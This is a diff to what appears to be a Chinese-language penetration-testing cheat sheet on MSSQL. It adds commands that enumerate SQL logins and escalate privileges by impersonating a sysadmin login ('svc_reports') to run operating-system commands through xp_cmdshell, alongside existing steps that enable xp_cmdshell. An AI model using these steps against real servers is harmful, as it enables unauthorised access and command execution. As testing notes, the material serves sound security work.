@@ -145,6 +145,7 @@ date: 2024-02-07
   $ impacket-mssqlclient <username>:<password>@<MSSQL IP> -windows-auth # 連線
   $ SELECT @@version; # 查版本（同時揭露 Windows Server 版本）
   $ SELECT SYSTEM_USER; # 查看當前使用者
+  $ SELECT name FROM sys.sql_logins # 列出有哪些登入帳號
   $ SELECT name FROM sys.databases; # 列資料庫
   $ use <database_name>;
   $ SELECT * FROM <database_name>.information_schema.tables; # 查表
@@ -158,6 +159,16 @@ date: 2024-02-07
   $ EXEC sp_configure 'xp_cmdshell', 1;
   $ RECONFIGURE;
   $ EXEC xp_cmdshell 'whoami';
+
+  # 如果目前的帳號沒有權限(例如唯獨模式)
+  ## 1. 先查詢有哪些登入 user
+  $ SELECT SYSTEM_USER;
+  ## 2. 查看可以 IMPERSONATE 哪一組帳號
+  $ SELECT pr.permission_name, p2.name FROM sys.server_permissions pr JOIN sys.server_principals p2 ON pr.major_id = p2.principal_id WHERE pr.grantee_principal_id = SUSER_ID()
+  ## 3. 確認該組帳號是 sysadmin
+  $ EXECUTE AS LOGIN='svc_reports'; SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin')
+  ## 4. 使用該組帳號執行 xp_cmdshell
+  $ EXECUTE AS LOGIN='svc_reports'; EXEC xp_cmdshell 'whoami'
   ```
 
 </details>
